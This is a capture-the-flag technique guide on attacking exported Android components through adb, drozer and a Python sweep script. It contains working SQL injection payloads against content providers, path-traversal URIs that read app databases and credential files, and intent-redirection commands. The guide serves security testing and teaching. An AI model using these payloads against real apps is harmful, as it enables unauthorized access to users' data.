---
title: "Exported Components - Attacking Activities, Services, Receivers and Providers"
category: mobile
subcategory: ipc
type: technique
tags: [exported, intent, activity, service, broadcast-receiver, content-provider, adb, am, pm, content, drozer, ipc, permissions, path-traversal, sql-injection, android, manifest]
difficulty: medium
summary: "Enumerate an app's IPC surface from the manifest and drive it from adb with am/content to reach code that the UI never exposes."
when_to_use:
  - "The manifest lists android:exported=\"true\" or an intent-filter on a non-launcher component"
  - "A flag-bearing activity is not reachable from the UI"
  - "You see a ContentProvider authority and want to query it"
tools: [adb, drozer, apktool, jadx, aapt2]
related: [android-apk-triage, android-webview-deeplinks, android-data-extraction, android-frida-basics]
---

## TL;DR

Any component with `android:exported="true"` (or, below `targetSdk 31`, any component with
an `<intent-filter>`) can be invoked by any app on the device - and by you, from `adb shell`.
`am start` for activities, `am start-foreground-service` for services, `am broadcast` for
receivers, `content query|insert|update|delete` for providers. Read the component's
`onCreate`/`onStartCommand`/`onReceive`/`query` for what it does with your extras.

## Recognise it

In `out-apktool/AndroidManifest.xml`:

```xml
<activity android:name=".SecretActivity" android:exported="true"/>
<service android:name=".FlagService" android:exported="true"/>
<receiver android:name=".CmdReceiver" android:exported="true">
    <intent-filter><action android:name="com.ctf.app.RUN"/></intent-filter>
</receiver>
<provider android:name=".NotesProvider" android:authorities="com.ctf.app.notes"
          android:exported="true" android:grantUriPermissions="true"/>
```

Red flags in the code:

- `getIntent().getStringExtra(...)` fed into a file path, a WebView, or `Runtime.exec`.
- `onReceive` acting on `intent.getAction()` with no sender verification.
- A provider whose `query()` concatenates `selection` into raw SQL, or whose
  `openFile()` joins an attacker-controlled path.
- `android:permission` missing, or set to a `normal` protectionLevel custom permission
  (any app can request it).

## Theory

### The exported rule

| targetSdk | Default `exported` |
|---|---|
| < 31 | `true` if the component declares any `<intent-filter>`, else `false` |
| >= 31 | must be declared explicitly; the app will not install otherwise |

`android:permission` on the component, or `<permission android:protectionLevel="...">`,
gates who may call it. Protection levels: `normal` (granted to anyone who asks),
`dangerous` (user prompt), `signature` (same signing key - the only real barrier),
`signatureOrSystem`.

`adb shell` runs as the `shell` user, which holds a large set of permissions and can
invoke anything not gated by `signature`. That makes it a perfect attacker stand-in.

### Provider surface

A `ContentProvider` exposes six entry points: `query`, `insert`, `update`, `delete`,
`getType`, `openFile`. Two classic bugs:

1. **SQL injection** - `db.query(TABLE, projection, selection, args, ...)` where
   `selection` comes from the caller. Inject via `--where`, or via a crafted projection
   (`-p "* FROM sqlite_master --"`).
2. **Path traversal in `openFile`** - `new File(root, uri.getLastPathSegment())` with no
   canonicalisation. Ask for `content://auth/files/..%2F..%2Fdatabases%2Fsecret.db`.

`android:grantUriPermissions="true"` plus a `FileProvider` with an over-broad
`<root-path path="/" />` in `res/xml/file_paths.xml` means any file the app can read is
reachable.

## Attack

1. Dump the manifest and list every exported component and its authority/actions.
2. For each activity: launch it directly, then launch it with each extra the code reads.
3. For each service: start it, with and without extras.
4. For each receiver: broadcast its action with the extras from `onReceive`.
5. For each provider: `content query` the obvious paths, then fuzz the path segment,
   then try SQL injection in `--where` and `--projection`.
6. Watch `logcat` throughout - components usually log what they did.

## Code

### Enumerate from the device and from the APK

```bash
# every exported component on the device for one package
adb shell dumpsys package com.ctf.app | sed -n '/Activity Resolver Table/,/^$/p'
adb shell dumpsys package com.ctf.app | grep -A3 -E 'Provider|Service|Receiver'

# providers with their authorities and read/write permissions
adb shell dumpsys package providers | grep -A5 com.ctf.app

# from the APK, without a device
aapt2 dump xmltree --file AndroidManifest.xml app.apk |
  grep -E 'E: (activity|service|receiver|provider)|android:name|android:exported|android:authorities|android:permission'

# readable version after apktool
grep -nE '<(activity|service|receiver|provider)|android:exported|android:authorities|android:permission|<action' \
  out-apktool/AndroidManifest.xml
```

### Activities

```bash
# launch an exported activity directly (-n = explicit component)
adb shell am start -n com.ctf.app/.SecretActivity

# with string, int and boolean extras
adb shell am start -n com.ctf.app/.SecretActivity \
  --es token "abcd" --ei level 9 --ez debug true

# with a data URI and an action (matches an intent-filter instead of a component)
adb shell am start -a android.intent.action.VIEW -d "ctfapp://flag/show" \
  -n com.ctf.app/.DeepLinkActivity

# with a Uri extra and a MIME type
adb shell am start -n com.ctf.app/.ImportActivity \
  -t "application/json" -d "file:///sdcard/payload.json"

# start and wait, printing the launch result
adb shell am start -W -n com.ctf.app/.SecretActivity

# array, float and long extras
adb shell am start -n com.ctf.app/.A --esa items "a,b,c" --ef ratio 1.5 --el big 4294967296

# include a nested (parcelled) intent - the classic intent-redirection payload
adb shell am start -n com.ctf.app/.ProxyActivity \
  --es target "com.ctf.app/.NotExportedActivity"
```

### Services

```bash
# background service (works below API 26 or when the app is foreground)
adb shell am startservice -n com.ctf.app/.FlagService --es cmd "dump"

# API 26+ foreground service
adb shell am start-foreground-service -n com.ctf.app/.FlagService --es cmd "dump"

# stop it again
adb shell am stopservice -n com.ctf.app/.FlagService
```

### Broadcast receivers

```bash
# fire the receiver's declared action
adb shell am broadcast -a com.ctf.app.RUN --es cmd "reveal"

# target the receiver explicitly (bypasses filter mismatches)
adb shell am broadcast -n com.ctf.app/.CmdReceiver -a com.ctf.app.RUN --es cmd "reveal"

# system broadcasts apps often mishandle
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -n com.ctf.app/.BootReceiver
adb shell am broadcast -a android.net.conn.CONNECTIVITY_CHANGE -n com.ctf.app/.NetReceiver

# ordered broadcast, capture the result data
adb shell am broadcast -a com.ctf.app.RUN --receiver-foreground --es cmd "ping"
```

### Content providers

```bash
# read a table
adb shell content query --uri content://com.ctf.app.notes/notes

# specific columns and a where clause
adb shell content query --uri content://com.ctf.app.notes/notes \
  --projection title:body --where "id=1" --sort "id DESC"

# write
adb shell content insert --uri content://com.ctf.app.notes/notes \
  --bind title:s:pwned --bind body:s:hello
adb shell content update --uri content://com.ctf.app.notes/notes \
  --bind body:s:changed --where "id=1"
adb shell content delete --uri content://com.ctf.app.notes/notes --where "id=1"

# SQL injection through the where clause: leak the schema
adb shell content query --uri content://com.ctf.app.notes/notes \
  --where "1=1) UNION SELECT name,sql FROM sqlite_master --"

# SQL injection through the projection
adb shell content query --uri content://com.ctf.app.notes/notes \
  --projection "* FROM sqlite_master --"

# path traversal through openFile
adb shell content read --uri "content://com.ctf.app.files/f/..%2F..%2Fdatabases%2Fusers.db" > users.db
adb shell content read --uri "content://com.ctf.app.files/f/../shared_prefs/creds.xml"

# call() entry point (undocumented method names come from the source)
adb shell content call --uri content://com.ctf.app.notes --method getFlag --arg x
```

### Automated sweep

```python
#!/usr/bin/env python3
"""ipc_sweep.py - parse a decoded AndroidManifest.xml and emit adb commands for every
exported component, plus a provider path fuzz list.

Usage: python3 ipc_sweep.py out-apktool/AndroidManifest.xml [--run]
"""
from __future__ import annotations

import subprocess
import sys
import xml.etree.ElementTree as ET

ANDROID = "{http://schemas.android.com/apk/res/android}"
PROVIDER_PATHS = ["", "/1", "/files", "/notes", "/users", "/data", "/cache", "/secrets"]
TRAVERSALS = [
    "..%2F..%2Fdatabases%2Fapp.db",
    "..%2F..%2Fshared_prefs%2Fprefs.xml",
    "../../../../data/data/{pkg}/shared_prefs/prefs.xml",
]


def attr(node: ET.Element, name: str) -> str:
    return node.get(ANDROID + name, "")


def exported(node: ET.Element, target_sdk: int) -> bool:
    raw = attr(node, "exported")
    if raw:
        return raw == "true"
    has_filter = node.find("intent-filter") is not None
    return has_filter and target_sdk < 31


def parse(path: str) -> tuple[str, list[str]]:
    tree = ET.parse(path)
    root = tree.getroot()
    pkg = root.get("package", "com.example")
    uses = root.find("uses-sdk")
    target_sdk = int(attr(uses, "targetSdkVersion") or 30) if uses is not None else 30
    app = root.find("application")
    cmds: list[str] = []
    if app is None:
        return pkg, cmds

    for tag, launcher in (("activity", "am start"), ("activity-alias", "am start"),
                          ("service", "am start-foreground-service"),
                          ("receiver", "am broadcast")):
        for node in app.findall(tag):
            if not exported(node, target_sdk):
                continue
            name = attr(node, "name")
            comp = f"{pkg}/{name}" if name.startswith(".") or "." not in name else f"{pkg}/{name}"
            perm = attr(node, "permission")
            note = f"   # permission={perm}" if perm else ""
            cmds.append(f"adb shell {launcher} -n {comp}{note}")
            for f in node.findall("intent-filter"):
                for act in f.findall("action"):
                    a = attr(act, "name")
                    cmds.append(f"adb shell {launcher} -a {a} -n {comp}")
                for data in f.findall("data"):
                    scheme = attr(data, "scheme")
                    host = attr(data, "host")
                    if scheme:
                        uri = f"{scheme}://{host or 'x'}/"
                        cmds.append(f'adb shell am start -a android.intent.action.VIEW -d "{uri}"')

    for node in app.findall("provider"):
        if not exported(node, target_sdk):
            continue
        for authority in attr(node, "authorities").split(";"):
            if not authority:
                continue
            for p in PROVIDER_PATHS:
                cmds.append(f"adb shell content query --uri content://{authority}{p}")
            cmds.append(
                f'adb shell content query --uri content://{authority}/notes '
                f'--where "1=1) UNION SELECT name,sql FROM sqlite_master --"')
            for t in TRAVERSALS:
                cmds.append(f'adb shell content read --uri "content://{authority}/{t.format(pkg=pkg)}"')
    return pkg, cmds


SAMPLE = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.ctf.app">
  <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="30"/>
  <application>
    <activity android:name=".SecretActivity" android:exported="true"/>
    <activity android:name=".DeepLinkActivity">
      <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <data android:scheme="ctfapp" android:host="flag"/>
      </intent-filter>
    </activity>
    <receiver android:name=".CmdReceiver" android:exported="true">
      <intent-filter><action android:name="com.ctf.app.RUN"/></intent-filter>
    </receiver>
    <provider android:name=".NotesProvider" android:authorities="com.ctf.app.notes"
              android:exported="true"/>
  </application>
</manifest>
"""


def main(argv: list[str]) -> int:
    if len(argv) < 2:
        print(__doc__)
        return 2
    pkg, cmds = parse(argv[1])
    print(f"# package: {pkg}   ({len(cmds)} probes)")
    for c in cmds:
        print(c)
        if "--run" in argv and c.startswith("adb "):
            subprocess.run(c, shell=True, check=False)
    return 0


if __name__ == "__main__":
    if len(sys.argv) == 1:
        import os
        import tempfile
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "AndroidManifest.xml")
            with open(p, "w", encoding="utf-8") as fh:
                fh.write(SAMPLE)
            pkg, cmds = parse(p)
        assert pkg == "com.ctf.app"
        assert any("SecretActivity" in c for c in cmds)
        assert any("ctfapp://flag/" in c for c in cmds)
        assert any("sqlite_master" in c for c in cmds)
        print("\n".join(cmds))
        print("selftest ok")
    else:
        sys.exit(main(sys.argv))
```

### drozer

```bash
# start the agent on the device and forward its port
adb forward tcp:31415 tcp:31415
adb shell am start -n com.mwr.dz/.activities.MainActivity   # then tap "Embedded Server -> Enable"
drozer console connect

# inside the drozer console:
#   run app.package.attacksurface com.ctf.app
#   run app.activity.info -a com.ctf.app
#   run app.activity.start --component com.ctf.app com.ctf.app.SecretActivity
#   run app.service.info -a com.ctf.app
#   run app.broadcast.info -a com.ctf.app
#   run app.broadcast.send --component com.ctf.app com.ctf.app.CmdReceiver --action com.ctf.app.RUN
#   run app.provider.info -a com.ctf.app
#   run app.provider.finduri com.ctf.app
#   run app.provider.query content://com.ctf.app.notes/notes --vertical
#   run scanner.provider.injection -a com.ctf.app
#   run scanner.provider.traversal -a com.ctf.app
#   run scanner.provider.sqltables -a com.ctf.app
```

### Watching what happened

```bash
adb logcat -c                                               # clear first
adb shell am start -n com.ctf.app/.SecretActivity
adb logcat --pid=$(adb shell pidof -s com.ctf.app) -v time  # only this app
adb shell dumpsys activity activities | grep -A5 com.ctf.app  # did it start?
adb logcat -b crash -d | tail -40                           # why it died
```

## Variants & pitfalls

- **`am start` says "Permission Denial"** -> the component is `exported="false"` or gated
  by a `signature` permission. Look for an *exported* component that forwards to it
  (intent redirection, see `android-webview-deeplinks`).
- **Extras of exotic types** (Parcelable, Bundle) cannot be sent from `am`. Write a tiny
  attacker APK, or use Frida to construct and fire the Intent in-process.
- **`content query` returns "No result found"** - the provider may require a specific
  path; enumerate with `drozer app.provider.finduri` which greps the DEX for `content://`.
- **`grantUriPermissions` + `FileProvider` with `<root-path path="/">`** is a full app-sandbox
  file read; check `res/xml/file_paths.xml`.
- **`android:process=":remote"`** means the component runs in a separate process; Frida
  must attach to that pid, not the main one.
- Receivers registered at runtime (`registerReceiver`) are not in the manifest. Hook
  `ContextImpl.registerReceiver` with Frida to enumerate them.

## Tools

- `adb` (`am`, `pm`, `content`, `dumpsys`) - no extra tooling needed.
- `drozer` - purpose-built IPC scanner with injection/traversal modules.
- `jadx` - to read what the component does with your extras.
- `apktool` / `aapt2` - manifest decoding.
- `frida` - for Parcelable extras and runtime-registered receivers.

## References

- Android developer documentation: app components, intents and intent filters, `android:exported`.
- Android developer documentation on ContentProvider and FileProvider path configuration.
- `drozer` project documentation for module names.
